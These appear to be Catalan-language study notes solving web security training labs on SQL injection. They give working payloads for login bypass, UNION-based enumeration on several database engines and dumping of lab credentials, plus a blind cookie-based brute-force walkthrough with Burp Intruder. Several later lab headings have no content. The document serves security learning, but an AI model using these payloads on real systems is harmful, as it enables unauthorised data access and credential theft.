## **Lab 1**: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

    /filter?category=Gifts' or 1=1-- -'

## **Lab 2**: SQL injection vulnerability allowing login bypass

    administrator'-- -

## **Lab 3**: SQL injection UNION attack, determining the number of columns returned by the query

    filter?category=Gifts' union select NULL, NULL, NULL-- -
## **Lab 4**: SQL injection UNION attack, finding a column containing text

    filter?category=Gifts' union select NULL,'1M2wiY',NULL-- -

## **Lab 5**: SQL injection UNION attack, retrieving data from other tables
1. Llistar TOTES les Bases de Dades:
        
        filter?category=Gifts' union select schema_name,NULL from information_schema.schemata-- -
2. Llistar TOTES les Taules de totes les BBDD:
        
        filter?category=Gifts' union select table_name,NULL from information_schema.tables-- -
3. Llistar TOTES les Taules d'1 BDD:
        
        filter?category=Gifts' union select table_name,NULL from information_schema.tables where table_schema='public'-- -
4. Llistar TOTES les Columnes d'una taula i una BDD en concret:
        
        filter?category=Gifts' union select column_name,NULL from information_schema.columns where table_schema='public' and table_name='users'-- -
5. Llistar Dades de diferents maneres
       
        a) filter?category=Gifts' union select NULL,group_concat(username,':',password) from users-- -
        b) filter?category=Gifts' union select NULL,group_concat(username,0x3a,password) from users-- -
            ---> Convertim els : en Hexadecimal
        c) filter?category=Gifts' union select NULL,group_concat(username,':',password) from users where username = 'admin'-- -
        d) filter?category=Gifts' union select NULL,group_concat(username,':',password) from users where username = '0x61646d696e'-- -
            ---> Convertim la paraula 'admin' en Hexadecimal

        Convertir 'admin' en Hexadecimal ==> echo "admin" | tr -d '\n' | xxd -ps

        5.1. SOLVED: filter?category=Gifts' union select username,password from users-- -
        5.2. SOLVED: filter?category=Gifts' union select NULL,username||':'||password from users-- -
              - OUTPUT: administrator:ria9b2ri5pwga9fk2s41

## **Lab 6**: SQL injection UNION attack, retrieving multiple values in a single column

    filter?category=Gifts' union select NULL,username||':'||password from users-- -
            OUTPUT: administrator/lt7elzdb9kleb4bdfy9f

## **Lab 7**: SQL injection attack, querying the database type and version on Oracle
    filter?category=Gifts' union select NULL,banner from v$version-- -

## **Lab 8**: SQL injection attack, querying the database type and version on MySQL and Microsoft
    filter?category=Lifestyle' union select NULL,@@version-- -

## **Lab 9**: SQL injection attack, listing the database contents on non-Oracle databases
    a) filter?category=Accessories' union select NULL,table_name from information_schema.tables where table_schema='public'-- -
	    OUTPUT: users_mozxmt, products
    b) filter?category=Accessories' union select column_name,NULL from information_schema.columns where table_schema='public' and table_name='users_mozxmt'-- -
	    OUTPUT: password_imfrmo, username_blbbus
    c) filter?category=Accessories' union select username_blbbus,password_imfrmo from users_mozxmt-- -
	        OUTPUT: administrator/4osd4u3aeqkfxw5z3zvk

## **Lab 10**: SQL injection attack, listing the database contents on Oracle

    a) filter?category=Gifts' union select NULL,owner from all_tables-- -
	    OUTPUT: APEX_040000, CTXSYS, MDSYS, PETER, SYS, SYSTEM, XDB
    b) filter?category=Gifts' union select NULL,table_name from all_tables where owner = 'PETER'-- -
	    OUTPUT: products, USERS_IFEEJB
    c) filter?category=Gifts' union select NULL,column_name from all_tab_columns where table_name = 'USERS_IFEEJB'-- -
	    OUTPUT: PASSWORD_HHELXQ, USERNAME_QLKZDD
    d) filter?category=Gifts' union select NULL,USERNAME_QLKZDD||':'||PASSWORD_HHELXQ from USERS_IFEEJB-- -
	    OUTPUT: administrator/l5j55i07t8chg0l6j2jd

## **Lab 11**: Blind SQL injection with conditional responses

    Amb BurpSuite pillar la petició de la pàgina principal i la vulnerabilitat esta en canviar el valor de la Cookie.
    Ens hem de fixar en el text "Welcome Back!".
    Si surt, és perquè el nostre codi s'esta interpretant. Però no ens mostra el codi.
    Si NO surt, és perquè el nostre codi NO s'esta interpretant i hi ha algun error.

    cookie: TrackingId=ILvPeZM3RkpyrlBj' and (select substring(username,1,1) from users where username='administrator')='a; session=qOsZS0ZY7BKg3nFzHmzl1MOz1SappPQ8

    Si enviem aquesta petició ens hauria de sortir "Welcome Back!", ja que si que existeix l'usuari admin.

    Ara escrivim:
    cookie: TrackingId=ILvPeZM3RkpyrlBj' and (select substring(password,1,1) from users where username='administrator')='a; session=qOsZS0ZY7BKg3nFzHmzl1MOz1SappPQ8

    I enviarem aquesta petició a l'intruder.

    A l'intruder on posa "Choose an attack type" farem tipus 'Sniper'.
    Seleccionem la lletra "a" després de l'administrator i a la dreta posem ADD§.
    La lletra a ens ha de quedar aixi: §a§

    Ens dirigim a la pestanya de Payloads.
    I on posa Payload Options (Simple List)
    Anem afegint el nostre diccionari: a,b,c,d,e,f.. 1,2,3,4..
    Tots els caracters que volguem.
    A la dreta clickem StartAttack

    Comprovara que la primera lletra de la password de l'usuari administrator sigui aquella.
    Com que a la pagina ens mostra un "Welcome Back" si ha funcionat, ens haurem de fixar en la columna "length" de l'atac que acabem de fer.
    Veig que tots tenen 11030 i la "k" un 11091.

    Per tant, si en el Repeater li posem
    Cookie: TrackingId=ILvPeZM3RkpyrlBj' and (select substring(password,1,1) from users where username='administrator')='k; session=qOsZS0ZY7BKg3nFzHmzl1MOz1SappPQ8
    Ens sortira el "Welcome Back!"
    Això em diu que la primera lletra de la password serà "k".

    Ens creem un script en Python anomenat SQLI_Conditional_Responses.py

    Fem pip3 install pwntools

    Abans de continuar amb l'script, volem averiguar de quants caracters esta feta la passwd.
    Anem provant el numero fins que trobem que és de 20.
    Cookie: TrackingId=ILvPeZM3RkpyrlBj' and (select 'a' from users where username='administrator' and length(password)>=20)='a; session=qOsZS0ZY7BKg3nFzHmzl1MOz1SappPQ8

    OUTPUT SCRIPT:
    python3 SQLI_Conditional_Error.py
    [◢] Fuerza Bruta: NQLIhBYeW4w1MyVo' and (select substring(password,20,1) from users where username='administrator')='m
    [→] Password: koa1z59sfl237dt7vmmm

## **Lab 12**: Blind SQL injection with conditional errors

## **Lab 13**: Blind SQL injection with time delays

## **Lab 14**: Blind SQL injection with time delays and information retrieval

## **Lab 15**: Blind SQL injection with out-of-band interaction

## **Lab 16**: Blind SQL injection with out-of-band data exfiltration

## **Lab 17**: SQL injection with filter bypass via XML encoding